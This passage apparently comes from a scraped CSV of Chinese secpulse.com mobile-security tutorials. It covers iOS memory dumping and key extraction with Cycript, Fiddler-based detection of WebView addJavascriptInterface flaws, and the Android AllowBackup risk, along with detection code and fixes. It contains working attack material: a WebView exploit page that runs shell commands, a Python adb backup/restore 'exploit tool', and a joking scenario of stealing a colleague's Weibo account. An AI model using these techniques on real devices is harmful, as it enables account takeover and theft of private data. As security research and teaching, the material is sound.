最终还是找到了：如此获取到了秘钥之后，就可以直接导入和生成证书了。【本文由wadcl原创投稿安全脉搏，安全脉搏独家发表本文，如需要转载，请先联系安全脉搏授权；未经授权请勿转载。】","2016-12-14 11:05:23","移动安全","如何突破双向证书认证防护","https://www.secpulse.com/archives/54027.html"
"5cca9925e0c518ef8fd59750","对iOS应用进行渗透测试的一个重要方面就是分析应用程序的runtime 。本文中，我将介绍怎样对iOS应用进行堆内容转储，并发布一个可以在iOS设备上转储App堆内容的小脚本。 你可以在…","SP小编","对iOS应用进行渗透测试的一个重要方面就是分析应用程序的runtime 。本文中，我将介绍怎样对iOS应用进行堆内容转储，并发布一个可以在iOS设备上转储App堆内容的小脚本。你可以在 NetSPI Github 下载这段脚本。该脚本基本上围绕着GDB做文章，只能转储内存中拥有“子区域(sub-regions)”的部分。我通常会在这些子区域中发现有效的认证 信息，当前正在使用的界面UI，以及实例化后的类属性。目前，该技术只适用于iOS7及以下版本。对iOS8而言，除非有一个可用的GDB版本，否则无法 正常使用。你不要使用从Cydia仓库中下载的默认GDB版本，而应该使用从“ http://cydia.radare.org ”下载的修正版。你可以点击这里 直接下载deb包 。下面将展示该过程中的截图，并演示脚本如何工作：首先，启动我们想要捕获堆数据并登入的App,本文以Facebook示例： 然后我们登入App，此时主屏上显示的应该是Facebook的用户时间线，我们保持这种状态不要动。接下来，我们使用SSH链接该设备，这样就能让App继续保持运行而不会被iOS变成后台应用。 用法：./heapdump.sh &lt;binary&gt; 以下是在 运行时 期间该脚本所输出的内容。这里我们能看到我们想要转储的二进制内容的名称 下面列出了所有转储后的.dmp文件，现在我们就能从中搜索认证信息和其他敏感数据。你通常能在其中发现密钥，或是在负责加密以及处理登录过程的实例化的类当中发现密码。我个人倾向于组合使用“string”和“xxd”命令来查看十六进制内容，但你可以选择使用任何顺手的十六进制编辑器。该技术可用于检测App中处理敏感数据的类，查看其在完成实例化之后是否已从内存中删除了这些敏感信息。所有的App都应当释放用于处理敏感数据的类和方法的内存空间，否则你就要承担被入傁者看到内存中所有可用数据的风险。下面，我列出了在该脚本中用到的GDB命令gdb –pid=”&lt;PID&gt;”info mach-regions (look for sub-regions)dump binary memory heap1.dmp &lt;sub-region range from above&gt;  【原文：ios-tutorial-dumping-the-application-heap-from-memory 翻译：yiyanghuadan 】","2015-01-14 16:39:11","移动安全","iOS教程：对App的内存堆内容进行转储","https://www.secpulse.com/archives/4183.html"
"5cca992de0c518ef8fd59751","在上一篇文章《iOS教程：对App的内存堆内容进行转储》中，我们讨论了如何使用GDB从iOS应用程序的堆中转储敏感信息。在本文中，我们将介绍如何使用Cycript实现相同的目的，并使用class-du…","PulseO0O","在上一篇文章《iOS教程：对App的内存堆内容进行转储》中，我们讨论了如何使用GDB从iOS应用程序的堆中转储敏感信息。在本文中，我们将介绍如何使用Cycript实现相同的目的，并使用class-dump-z专门输出类属性或者实例变量。这一次，我们将以更加自动化的方式来自动解析二进制文件的类转储，并创建必要的Cycript脚本来从内存中获取特定的属性。此外，我以后还将给出实现以上功能的另一工具。留意我们的GitHub账号，以获取最新的工具和脚本。0x01 class-dump-z获取类信息对于一个iOS应用程序，如果我们不能获取它的源代码，那么我们就必须首先解密二进制文件。首先，我们转储该文件的类信息。虽然已经有很多教程讲解如何进行解密，但是Clutch是我常用的工具，因为它使用起来很容易，而且它还能生成一个包含解密后的二进制文件信息的IPA文件，所以有需要时你就可以在其他设备上重新安装它。在我们提取和安装解密后的二进制文件后，我们可以运行class-dump-z来获得所有类的头文件信息、属性、类方法、实例方法等等。MAPen-iPad-000314:~ root# ./class-dump-z -z TestApp [TRUNCATED] @interface CryptoManager : XXUnknownSuperclass {@private	NSData* key;}@property(retain, nonatomic) NSData* key;+(id)CryptoManager;-(id)init;-(id)cipher:(id)cipher key:(id)key context:(unsigned)context;-(id)cipher:(id)cipher key:(id)key context:(unsigned)context withIV:(BOOL)iv;-(id)cipher:(id)cipher key:(id)key context:(unsigned)context withIV:(BOOL)iv usingIV:(id)iv5;-(id)cipher:(id)cipher key:(id)key context:(unsigned)context withIV:(BOOL)iv usingIV:(id)iv5 withPad-ding:(BOOL)padding;-(void)clearKey;-(void)dealloc;-(id)decryptData:(id)data;-(id)decryptData:(id)data usingIV:(id)iv;-(id)decryptData:(id)data usingIV:(id)iv withPadding:(BOOL)padding;-(id)decryptData:(id)data withIV:(BOOL)iv;-(id)decryptData:(id)data withIV:(BOOL)iv withHeader:(BOOL)header;-(id)decryptData:(id)data withKey:(id)key;-(id)decryptString:(id)string;-(id)decryptString:(id)string withIV:(BOOL)iv;-(id)decryptString:(id)string withIV:(BOOL)iv withHeader:(BOOL)header;-(id)decryptString:(id)string withIV:(BOOL)iv withHeader:(BOOL)header withKey:(id)key;-(id)decryptString:(id)string withKey:(id)key;-(id)encryptData:(id)data;-(int)encryptData:(id)data AndAppendToFileAtPath:(id)path initiatedByUnlockOperation:(BOOL)operation error:(id*)error;-(id)encryptData:(id)data usingIV:(id)iv;-(id)encryptData:(id)data withKey:(id)key;-(id)encryptString:(id)string;-(id)encryptString:(id)string withKey:(id)key;-(id)hashString:(id)string;-(id)hashString:(id)string salt:(id)salt;-(BOOL)isHashOfString:(id)string equalToHash:(id)hash;-(BOOL)isHeaderValid:(id)valid;-(id)newHeader;-(unsigned long)readEncryptedData:(void**)data atPath:(id)path offset:(long)offset length:(unsigned long)length initiatedByUnlockOperation:(BOOL)operation error:(id*)error;@end [TRUNCATED]所以从上面代码中可以看出，TestApp中有一个类“CryptoManager”，并且它有一个属性“key”。这一点看起来很有趣，因为从上面信息中看出内存中可能会有一个加密密钥。接下来，我们使用Cycript从内存中抓取特定的属性。需要注意的是，在运行时期间，在登陆之前，类“CryptoManager”就被实例化了，但只有用户曾经在该设备上成功登录过才可以。此外，即使该类不再需要（例如，用户退出账号）了，它也并没有被清理掉，而这正是漏洞所在。在这个例子中，在前面的会话中我们已经成功登录，所以在下一次用户登录之前类已经存在于内存中。0x02 获取实例信息首先，我们通过一个SSH会话hook 正在运行的TestApp进程，这样我们就可以不用管运行在iOS设备上的应用程序了。MAPen-iPad-000314:~ root# cycript -p TestAppcy#既然我们已经hook成功，下面我们接着讨论Cycript中的choose方法。Choose方法扫描堆以匹配类名字，并返回一个匹配目标类结构的对象数组。所以，如果我们输入“choose（MyClass）”，那么它将包含一个索引数组，该数组中包含着当前内存中（或者匹配结构的）类MyClass所有的实例化对象。下面的输出仅仅是第一个索引对象，它的索引值是“0”，并将其存储在一个变量“a”中。如果你更喜欢使用GDB，我们也可以返回内存位置，然后利用GDB转储内存的子区域中的所有内容，或者设置断点并观察寄存器。至于如何扫描堆，你可以查看上一篇文章《iOS教程：对App的内存堆内容进行转储》。然而，需要注意的是，该数组中可能有不止一个类的实例对象，那么你就需要遍历每个索引来得到目标类实例的属性。cy# a=choose(CryptoManager)[#""&lt; CryptoManager: 0x17dcc340&gt;"",#""&lt; CryptoManager: 0x17f42ba0&gt;""]接下来，为了方便我们以后抓取密钥并解密应用中的任何数据，现在我们从内存中转储属性“key”。cy# a[0].key.hexString@""6D2268CFFDDC16E890B365910543833190C9C02*DCA2342A9AEED68428EF9B6""Bingo！现在我们已经拥有了十六进制的密钥，后面我们将可以利用此密钥来解密应用程序想要加密的任何东西。0x03 实现自动化现在，我们讨论下如何对上面操作实现自动化，并理清我们所了解的以及如何通过编程实现自动化。我们知道，class-dump-z输出中包含了所以类和它们属性。但我们不知道的是那些类目前是否已经实例化，而且我们也不知道内存中那些类实例化了多少次。所以，我们能做的就是解析class-dump-z的输出，并创建一个类和它们属性的映射图。既然我们有了映射图，那么现在我们就可以创建Cycript脚本来获取相关信息。然而，需要注意的是，这种技术只是针对已经实例化的类，我们并不会涉及在Cycript中如何创建一个新的实例，因为已经有很多教程和书籍介绍过了。所以，我们必须从choose方法中阅读Cycript的输出内容，以此来确定对象已经在内存中实例化了多少次。为了实现这一点，我们可以使用JavaScript来获得数组长度：cy# choose(CryptoManager).length2cy#很酷吧，现在我们知道需要对数组循环多少次来获取“CryptoManager”所有的实例对象。现在我们就可以继续cycript脚本的编写。Cycript可以将脚本作为参数，一个基本的脚本必须包含我们想运行的命令，就像下面一样：MAPen-iPad-000314:~ root# cat dump.cya=choose(CryptoManager)[0]a.key.hexString MAPen-iPad-000314:~ root# cycript -p TestApp dump.cy@""6D2268CFFDDC16E890B365910543833190C9C02*DCA2342A9AEED68428EF9B6""0x04 遗留问题不过，有一个我似乎无法解决的问题是，当你运行一个脚本时，Cycript只返回最后一行输出到终端，而不是所有的输出。所以，要从终端输出多个类以及它们的属性，你就不得不为每个类及属性创建一个新脚本。如果谁知道如何突破这个限制，请告诉我如何实现，或者你也可以用Cycript JavaScript（如果你喜欢这种语言）写出来。【原文：iOS Tutorial – Dumping the Application Memory Part 2   安全脉搏PulseO0O翻译整理发布 】","2015-03-16 13:19:08","移动安全","iOS教程：Dump应用程序内存 Part2","https://www.secpulse.com/archives/5415.html"
"5cca992de0c518ef8fd59752","一、Fiddler介绍 Fiddler是最强大最好用的Web调试工具之一，它能记录所有客户端和服务器的http和https请求，允许你监视，设置断点，甚至修改输入输出数据，Fiddler包含了一个强大…","SP胖编","一、Fiddler介绍Fiddler是最强大最好用的Web调试工具之一，它能记录所有客户端和服务器的http和https请求，允许你监视，设置断点，甚至修改输入输出数据，Fiddler包含了一个强大的基于事件脚本的子系统，并且能使用.net语言进行扩展。你对HTTP 协议越了解， 你就能越掌握Fiddler的使用方法. 你越使用Fiddler,就越能帮助你了解HTTP协议。Fiddler无论对开发人员或者测试人员来说，都是非常有用的工具。网上博文已有很全面的教程说明，大家可参考此篇博文http://www.cnblogs.com/TankXiao/archive/2012/02/06/2337728.html。以及官方英文文档：http://docs.telerik.com/fiddler/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse。注意，这不是一篇工具介绍文档，:)二、Fiddler的脚本系统在路径“我的文档/fiddler2/Scripts/”下有个js文件CustomRules.js，这个就是fiddler在启动时加载的脚本，所有监听到的http（https）数据也都会流经这个脚本进行处理（这么表述好像不准确，fiddler将流量数据接收后交给这个脚本进行二次处理，也就是我们自定义的处理过程，我们可以什么都不做，也可以任意修改发送或接收的数据结果）。安装好fiddler后界面右边有个tab页FiddlerScript，点开后就是CustomRules.js内容了，大概是这个样子的： 如果没有这个tab就去下载fiddler的独立的脚本编辑工具FiddlerScript Editor，地址http://d585tldpucybw.cloudfront.net/docs/default-source/fiddler/fiddlersyntaxsetup.exe?sfvrsn=4，脚本编辑器还带API介绍，推荐下载用它来编辑。 如上图所示：右侧是fiddler的脚本api，但是坑爹的是，变量只有简单的一个变量类型，方法也只有一个参数类型，关于方法的介绍也是简单几句话，没有example code可参考，我在官网也没翻到比较详细的介绍。两个比较重要的方法就是OnBeforeRequest和OnBeforeResponse了，分别代表在请求前和接收数据前的动作。我们可以修改发送的请求，也可以修改服务器返回的响应，但是这个响应只针对本机生效。 三、WebView远程代码执行Android API level 16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法，简单的说就是通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接操作本地的J*A接口。该漏洞最早公布于CVE-2012-6636【1】，其描述了WebView中addJavascriptInterface API导致的远程代码执行安全漏洞。具体参考链接：http://www.droidsec.cn/webview-远程代码执行漏洞浅析。四、检测webview漏洞原理现在大家一般都用下面的一段html代码来检测webview漏洞的存在与否。&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=""UTF-8""/&gt;&lt;title&gt;WebView漏洞检测--捉虫猎手&lt;/title&gt;&lt;meta name=""viewport"" content=""width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0""&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;提示：如何检测出“accessibility”和 “accessibilityTraversal”接口----设置-辅助功能-开启系统或第三方辅助服务&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;font color=red&gt;如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;&lt;script type=""text/javascript""&gt;function check(){    for (var obj in window)     {        try {            if (""getClass"" in window[obj]) {                try{                    window[obj].getClass();                    document.write('&lt;span style=""color:red""&gt;'+obj+'&lt;/span&gt;');                    document.write('&lt;br /&gt;');                }catch(e){                }               }        } catch(e) {        }    }}check();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 通过遍历当前webview控件里的对象，如果对象存在getClass方法就能证明这个webview是有远程代码执行漏洞的。这个html只打印出了出现漏洞的接口名，完全可以把代码替换成反射java.lang.Runtime调用exec方法来执行二进制文件（这是一条用途，能做的事太多了），下面是一个简单的利用代码：&lt;html&gt;  &lt;body&gt;    &lt;script&gt;    function execute(cmdArgs)    {        for (var obj in window)         {            try {                if (""getClass"" in window[obj]) {                    try{                        var res = window[obj].getClass().forName(""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(cmdArgs);                        document.write(getContents(res.getInputStream()));                        return true;                    }catch(e){                    }                   }            } catch(e) {            }        }    }    execute([""/system/bin/sh"", ""-c"", ""ls -al /mnt/sdcard/""]);    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt; 上面的代码通过漏洞执行了命令 ls -al /mnt/sdcard/ 列出了sd卡的文件。这样我们可以修改OnBeforeRequest方法，修改请求的url为漏洞测试页面http://appscan.360.cn/blog/webview.html，或是修改OnBeforeResponse方法，在返回的html代码里插入我们的测试代码。 五、修改脚本添加测试代码首先在类开始的地方加上一个Rule菜单选项：public static RulesOption(""&amp;Webview漏洞测试（暴力版）"")var m_Webviewscan: boolean = false; 接着在OnBeforeRequest方法里进行判断与修改：if(m_Webviewscan){if(oSession.HTTPMethodIs(""GET"")){oSession.url = ""/webview.html"";oSession.oRequest[""Host""] = ""www.secpulse.com"";}} 这样我们访问每个url时会判断当前连接类型是POST还是GET，因为loadurl的方式是GET的。如果为GET，我们替换host和url为我们的漏洞测试地址。测试结果如图：另外一种方法，修改OnBeforeResponse，同样的，添加一个菜单：public static RulesOption(""&amp;Webview漏洞测试（温柔版）"")var m_Webviewscan_response: boolean = false; 点击Editor的菜单Go-to OnBeforeResponse，加入如下的代码：if (m_Webviewscan_response){oSession.utilDecodeResponse();if(oSession.oResponse.headers.ExistsAndContains(""Content-Type"",""text/html"") || oSession.utilFindInResponse(""&lt;html"",false)&gt;-1){var oBody = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);oBody = oBody.ToLower();var str=""&lt;script type=\""text/javascript\""&gt;var str=\""\"";for (var obj in window) {try {if (\""getClass\"" in window[obj]) {try{window[obj].getClass();str=str+obj;str=str+\""\&lt;br&gt;\"";}catch(e){}}}catch(e) {}}if(str!=\""\""){document.write('&lt;span style=\""color:red\""&gt;'+str+'&lt;/span&gt;');}&lt;/script&gt;"";if(oSession.utilFindInResponse(""&lt;head"",false)&gt;-1){oBody = oBody.Replace(""&lt;head&gt;"",""&lt;head&gt;""+str);}else{oBody = oBody.Replace(""&lt;body&gt;"",""&lt;body&gt;""+str);}oSession.utilSetResponseBody(oBody);}}} 在响应的response中在head或body之后插入检测js脚本，测试结果如图：其实这篇文章没什么技术含量，最近写了两篇文章都是关于工具增强的，对于这类可自定义插件进行功能增强的工具，大家开动“懒人精神”，怎么方便自己怎么来，希望大家都能写出自己的插件。PS. fiddler还支持.net c#拓展，会相关开发技能的同学可写c#插件，参考链接http://www.java123.net/v/524854.html【原文：Fiddler插件编写之WebView远程代码执行检测 作者:Sniperhg 】","2015-03-22 23:27:56","移动安全","Fiddler插件编写之WebView远程代码执行检测","https://www.secpulse.com/archives/5525.html"
"5cca992ee0c518ef8fd59753","前言 笔者在使用自己编写的 Drozer 模块对国内流行的安卓手机应用进行自动化扫描后发现有大量涉及用户财产和隐私的流行安卓应用存在 Android AllowBackup 漏洞，已测试成功受到漏洞影…","SP胖编","前言笔者在使用自己编写的 Drozer 模块对国内流行的安卓手机应用进行自动化扫描后发现有大量涉及用户财产和隐私的流行安卓应用存在 Android AllowBackup 漏洞，已测试成功受到漏洞影响的应用包括：新浪微博，百度云网盘，美团，大众点评，去哪儿等等。漏洞案例先来看一个情景案例，某IT男一直暗恋部门某女神，一天女神手机太卡了找IT男帮助清理手机空间，IT 男高兴地答应女神两分钟搞定，屁颠屁颠的跑到自己电脑旁边连上手机，女神在一边呆呆的看着IT男敲了几行代码然后在手机上点了几下，最后果然两分钟不到就搞定了，在女神谢着离开后，IT男露出了 WS 的笑容。没错，他成功了盗到了女神的微博帐号，终于不用问同事女神的微博帐号是多少了~当然这不是结局，一天晚上睡觉时，他看了女神的微博私信后心突然碎了。到底发生了什么，这背后有啥不可告人的秘密？且看本文详细分析。漏洞背景在谷歌 2010 年发布 Android 2.2 Froyo  (冻酸奶)系统中，谷歌引入一个了系统备份的功能，允许用户备份系统应用和第三方应用的apk安装包和应用数据，以便在刷机或者数据丢失后恢复应用。 第三方应用开发者需要在应用的 AndroidManifest.xml 文件中配置 allowBackup 标志(默认为 true )来设置应用数据是否能能够被备份或恢复。当这个标志被设置为true时应用程序数据可以在手机未获取 ROOT 的情况下通过adb调试工具来备份和恢复，这就允许恶意攻击者在接触用户手机的情况下在短时间内启动手机 USB 调试功能来窃取那些能够受到 AllowBackup 漏洞影响的应用的数据，造成用户隐私泄露甚至财产损失。使用反编绎工具 JEB 查看 weibo 客户端 manifest 配置： 在之前的案例正是因为新浪微博安卓客户端(最新版) AndroidManifest.xml 并没有配置：1android:allowBackup=“false”导致女神手机中的微博客户端数据可以在短时间内通过 ADB 调试备份到电脑中最后恢复到IT男手机，然后IT男以后每天就可以用女神的帐号看女神发了啥微博和私信内容。当然可利用的场景当然不止于此，想想，如果存在漏洞的是你的团购应用呢（看看有啥团购券我先来用吧），当然还有你的网盘应用（说不定可以看女神的私密照~），哦，对了连社交和理财应用也不能放过（女神们还敢把手机给 IT 男清理不）。 检测方法1）手工检测测试环境：Windows 7，ADB 调试工具物理接触目标手机1，连接手机1到 PC 端手机1和手机2均未被 ROOT，开启 USB 调试不用安装其它应用，不启动被测试的应用测试流程：连接安装开启USB调试手机1 到PC端在PC自动（也可以提前）安装好手机驱动后   启动命令行界面输入以下命令：12345adb devices #显示已连接的设备列表，测试手机是否正常连接adb backup -nosystem -noshared -apk -f com.sina.weibo.ab com.sina.weibo #-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -apk表示备份应用APK安装包 -f 表示备份的.ab文件路径和文件名 最后是要备份应用的packageName点击手机1确认备份界面的“备份我的数据”等待备份完成，至此微博客户端数据成功备份为 com.sina.weibo.ab 文件断开手机1的连接，可以把手机还给女神啦连接手机2 ，在命令行界面下输入以下命令：123adb kill-server  #关闭ADBadb devices #重新启动ADB，检测手机2是否成功连接adb restore com.sina.weibo.ab 点击手机2确认恢复界面的“恢复我的数据”等待恢复完成打开手机2中新安装的微博客户端，测试可正常登录手机1中帐号执行各种操作，且长期有效。2）在线检测目前国内三个主要的Android应用漏洞在线检测系统均能较好的检测此漏洞，建议普通用户和开发者使用腾讯金刚审计系统上传应用安装包进行检测。 1.腾讯金刚审计系统检测结果（ http://service.security.tencent.com/kingkong ）2.阿里聚安全检测结果（ http://jaq.alibaba.com/ ）  3.360捉虫猎手检测结果（ http://appscan.360.cn/ ）  影响范围目前测试了手上一台安装有Android 4.1.1系统的魅族MX2手机和安装有Android 4.4.2系统的魅族MX4手机均测试成功，理论上影响Android 2.2-Android 4.4系统中存在风险的应用。建议评级：尽管此漏洞的利用条件较高，需要物理接触，但此漏洞对涉及用户财产与隐私类的APP来说杀伤力较大，建议厂商视情况修复。金融类APP 高危支付类APP 高危团购类APP 中危社交类APP 中危网盘类APP 中危其它类APP 低危/无影响修复方案开发者如要避免应用数据泄露的风险，应当在设置 AndroidManifest.xml 文件中配置 android:allowBackup=“false”，此时应用程序数据无法被备份和恢复。或者在应用启动时检测手机硬件和网络环境是否改变，如果存在异常则强制退出或重新登录。编写Drozer模块实现漏洞自动化扫描Drozer是MWR InfoSecurity公司开发的一款安卓应用安全评估框架，其社区版开源在Github上（https://github.com/mwrlabs/drozer ）。对于从事安卓应用漏洞测试的安全研究者们来说，他们可以使用drozer提供的框架自己编写模块(Module)方便对的安卓应用进行漏洞检测与利用。以下是自己编写一个Drozer Module，用于自动化批量检测手机中的哪些应用存在AllowBackup风险。import refrom drozer import androidfrom drozer.modules import common, Module class AbChecker(Module, common.Assets,common.PackageManager):     name = ""check if app can be backup and restore by usb debugging""    description = ""see:htttp://www.droidsec.cn""    examples =""""""    dz&gt; run scanner.misc.abchecker -a    -&gt; it will run the script to check all apps    dz&gt; run scanner.misc.abchecker -p com.android.chrome     -&gt; it will run the script to check the provided package    """"""    author = ""DroidSec.cn""    date = ""2015-03-07""    license = ""BSD (3-clause)""    path = [""scanner"", ""misc""]    permissions = [""com.mwr.dz.permissions.GET_CONTEXT""]     VULNERABLE_API = 'android:allowBackup=""true""'          def add_arguments(self, parser):        parser.add_argument(""-p"", dest=""pkg"",help=""the identifier of the package"")        parser.add_argument(""-a"", action=""store_true"",dest=""all"",help=""the identifier of the package"")     def execute(self, arguments):        if arguments.pkg != None:            #self.stdout.write(arguments.pkg)            self.__write_manifest(arguments.pkg)        elif arguments.all == True:            self.stdout.write(""[color yellow] Start scan[/color]""+""\n"")            for package in self.packageManager().getPackages(common.PackageManager.GET_PERMISSIONS):                try:                    self.__write_manifest(package.packageName)                except Exception, e:                    print str(e)            self.stdout.write(""[color yellow] Scan finish[/color]""+""\n"")                     def __write_manifest(self, package):        lines=self.getAndroidManifest(package).split(""\n"")        r1=re.compile(r'\&lt;application')        r2=re.compile(r'allowBackup=""false""')        vulnerable=0        for line in lines:            line = str(line)            isApplicationTag=re.search(r1,line)            if isApplicationTag != None:                isAllowBackup=re.search(r2,line)                    #self.stdout.write(line+""\n"")                if isAllowBackup == None:                    self.stdout.write(""[color red] %s is vulnerable[/color]""%package+""\n"")                else:                        continue            else:                continue 运行截图：   注意事项：此drozer module检测原理是匹配应用manifest文件中是否配置了allowBackup=“false”来判断应用数据是否可备份和恢复，实际测试会发现一部分应用能成功备份和恢复但就是无法登录（比如手机淘宝和京东客户端），这说明厂商已经考虑到此设置可能带来的安全风险，并做出了相应限制，此类应用是安全的。 编写脚本实现自动攻击和利用如上文所述，整个漏洞测试过程中需要输入不少命令，对于手速慢和不习惯敲命令的人来说还是略麻烦了点，所以我们可以编写Python脚本来实现自动化攻击和利用。#!/usr/bin/python #coding:utf8  import commandsimport re,sysfrom optparse import OptionParser def usage():    print '''    ------------------------------------------------------------------                Android Application AllowBackup Exploit Tool     Usage:DroidSec_AbHack.py -p com.xxx.xxx(packageName) -b (backup)           DroidSec_AbHack.py -p com.xxx.xxx(packageName) -r (restore)     How to check the  security vulnerabilities of application?    Go to the professional Android security Website!                    =&gt;  http://www.droidsec.cn      ------------------------------------------------------------------    ''' class AbHack:    def __init__(self,adb,pkg):        self.adbdir=adb        self.package=pkg     def getinfo(self):        (status,output)=commands.getstatusoutput(self.adbdir+'devices')        r=re.findall('device',output)        if len(r) &gt;= 2:            return ""ok""        else:            return ""waiting""     def backup(self):        if self.getinfo()==""ok"":            print ""Start backup......""            output=commands.getoutput(str(self.adbdir)+""backup -nosystem -noshared -apk -f ""+str(self.package)+"".ab ""+str(self.package))            print output            print ""backup success!""        else:            print ""Please connect your mobile phone(usb debugging must been enabled) orcheck the ADB directory is configurd properly""     def restore(self):        commands.getstatusoutput(self.adbdir+""kill-server"")          if self.getinfo()==""ok"":            print ""start restore...""            output=commands.getoutput(str(self.adbdir)+""restore ""+str(self.package)+"".ab"")            print output        else:            print ""Please connect your mobile phone(usb debugging must been enabled) or check the ADB directory is configured properly"" if __name__ == ""__main__"":     adbdir=""/Users/nickycc/Downloads/adt-bundle-mac/sdk/platform-tools/adb "" #please set the ADB file directory before use    parser = OptionParser()     parser.add_option(""-p"", action=""store"", dest=""pkg"")     parser.add_option(""-b"", action=""store_true"",dest=""abhack"")    parser.add_option(""-r"", action=""store_false"",dest=""abhack"")    (options, args) = parser.parse_args()     usage()    if len(sys.argv) &lt;=1:        sys.exit()    elif options.abhack==True:        Backup=AbHack(adbdir,options.pkg)        Backup.backup()    elif options.abhack==False:        Restore=AbHack(adbdir,options.pkg)        Restore.restore()    else:        sys.exit() 运行截图： 应用备份生成的.ab文件其实是可以解包的，解包后的目录结构如下： 分别对应了androidmanifest.xml，apk安装包，database目录，files目录，其它目录以及shared_prefs目录，我们可以通过解包来对窃取的应用数据进一步分析。解包的python脚本如下：# coding=utf-8 import argparseimport osimport sysimport zlib  C_BUFFER_SIZE = 1048576  def ArgParse():    """"""    Parses the command line arguments     :return: argparse dictionary    """"""    # parse command line arguments    parser = argparse.ArgumentParser(        description=""xbackup: extracts an Android ICS+ backup file."")    parser.add_argument(""ipath"",                        help=""Input path."")    parser.add_argument(""opath"",                        help=""output path."")    args = parser.parse_args()    return args  def Extract(args):    """"""    Extracts the .tar file of an Android Backup. Assumes the backup is not encrypted and is    compressed.     :param args:    :return:    """"""    ifile = open(args.ipath, ""rb"")    ofile = open(args.opath, ""wb"")    data = ifile.read(C_BUFFER_SIZE)    print data    pos = data.find(""none\n"") + 5    data = data[pos:]    dc = zlib.decompressobj()    while data:        ofile.write(dc.decompress(data))        data = ifile.read(C_BUFFER_SIZE)    ifile.close()    ofile.close()  def main():    args = ArgParse()    if os.path.isfile(args.ipath):        Extract(args)    else:        print ""Could not open input file!.""        return 1    return 0 if __name__ == ""__main__"":    sys.exit(main()) 更多猥琐利用方法国外安全公司PALO ALTO早在2014年8月就发过研究报告称超过94%的流行应用存在此漏洞， 大牛Claud Xiao更是在去年Hitcon会议分享过与此有关的研究，如何让这个被很多人厂商视如鸡肋的漏洞有为猥琐的利用呢？这里提两点自己想到的，欢迎大家一起来交流 : )1）在APP漏洞里不安全的内部存储绝对是十分常见的漏洞，比如密码明文储存。笔者曾在测试某金融类APP时发现该APP在应用内部(/data/data/com.xx.xx/shared_prefs/)存储了明文的手势密码(如下图中的lock.xml)，正常情况下如果用户手机是未ROOT的，就算明文存储也没法获取到，漏洞影响相对较小，而继而我发现该理财APP同时存在allowbackup漏洞，也就是说我可以先将该应用数据备份到另一台已经获取ROOT手机，然后我不仅获得了用户帐号登录权限，连手势密码我都可以直接修改成任意（服务器端没做验证）或者相同（服务器端有验证）。还有一种情况是应用数据库中(/data/data/com.xx.xx/database/)直接存储了用户的登录帐号和密码那相当于直接利用allowbackup盗得了用户帐户密码。  2）LastPass(一个用户密码管理工具）曾经被发现存在通过备份到其它手机来清除手势密码来登录获取用户储存在LastPass上的所有密码的漏洞（CVE-2013-5113 and CVE-2013-5114）。发散一下思维，储存用户其它密码的还有哪些应用？对！浏览器，那些习惯了记住密码的用户很可能就会被存在漏洞的浏览器卖了。其它就看大家的更猥琐的发挥了~ 参考资料：https://www.paloaltonetworks.de/content/paloaltonetworks-com/global/cn_zh/index/company/press/2014/palo-alto-networks-unveils-security-risks-in-android-internal-storage.htmlhttp://researchcenter.paloaltonetworks.com/2014/08/insecure-internal-storage-android/http://developer.android.com/reference/android/R.attr.html#allowBackuphttp://blog.c22.cc/2013/08/01/bsideslv-android-backup-unpacker-release/http://nelenkov.blogspot.fi/2012/06/unpacking-android-backups.htmlhttps://github.com/info-lab/ABXhttps://github.com/mwrlabs/drozer附件：codes.zip【原文：详解android-app-allowbackup配置带来的风险 作者Nicky  SP胖编整理发布】","2015-03-11 1:27:29","移动安全","详解Android App AllowBackup配置带来的风险","https://www.secpulse.com/archives/5228.html"
"5cca992ee0c518ef8fd59754","继上一篇《Android APP安全测试入门》之后，我们又来到了本篇文章，即利用调试器来进行Android APP安全测试。 方法简介 本方法的独特之处是，我们并不需要获取Android设备的root…","PulseO0O","继上一篇《Android APP安全测试入门》之后，我们又来到了本篇文章，即利用调试器来进行Android APP安全测试。方法简介本方法的独特之处是，我们并不需要获取Android设备的root权限。利用该方法我们可以逐步进入到APP的内部，一步一步地学习到该应用的实现逻辑，并有可能获得有关该APP的关键信息或敏感算法，例如在加密前拦截数据流，获取加密密钥、密码以及其他敏感数据等。此外，对移动应用渗透测试人员和有深入了解Android平台攻击方式想法的开发者来说，本方法将会是一个很好的选择。本篇文章流程安排如下：所需工具列表Android设备设置检查APP是否可调试修改AndroidManifest.xml开启APP调试功能IDE准备Dump apk并反编译获取Java源代码附加调试器结语1、所需工具列表首先，我们给出本方法所使用的所有工具的列表：Windows/Mac OS X/Linux系统Java（推荐1.7版本）IDE（Eclipse，IntelliJ IDEA，Android Studio皆可）Android SDK（下载）ApkTool（下载）或者APK Studio（下载）Android设备或模拟器Dex2Jar（下载）JD-GUI（下载）在这篇文章的演示中，我使用的是Windows 8操作系统、IntelliJ IDEA和APK Studio。使用的Android手机是Android4.4.4的Nexus 4。在这里，推荐大家将所有工具的路径都添加到path环境变量中，这样使用起来非常便捷。2、Android设备设置这一步中，我们先设置一下手机，为下面做好准备。设置开发者选项首先需要做的就是确保我们的安卓手机启用了USB调试功能，这也是我们可以使用Android SDK工具集与手机通信的前提条件。要做到这一点，我们需要启用开发者选项功能。如果你正在运行一个普通的安卓设备，那么你可以通过导航到“Settings”=&gt;“About phone”，然后单击“Build number”，最终手机应该提示开发者选项已启用。（其实这里直接进行“设置”=&gt;“开发者选项”=&gt;“开启开发者选项”就可以了。[译者注]）开启USB调试下一步，我们通过进行“Settings”=&gt;“Developer options”=&gt;”USB 